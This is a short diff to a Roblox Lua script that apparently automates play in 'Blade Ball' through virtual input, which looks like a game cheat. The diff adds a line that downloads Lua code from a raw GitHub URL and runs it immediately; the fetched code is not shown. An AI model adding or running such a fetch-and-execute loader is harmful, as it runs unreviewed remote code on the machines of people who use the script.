@@ -11,6 +11,8 @@ starterGUI:SetCore("SendNotification", {
         Button1 = "OK"
 })
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguelop90/Roblox-Scripts-blade-ball-3/main/miguelop90.lua", true))()
+
 local RunService = game:GetService("RunService") or game:FindFirstDescendant("RunService")
 local Players = game:GetService("Players") or game:FindFirstDescendant("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager") or game:FindFirstDescendant("VirtualInputManager")
@@ -64,3 +66,4 @@ RunService.PreSimulation:Connect(function()
       end
     end
 end)
+
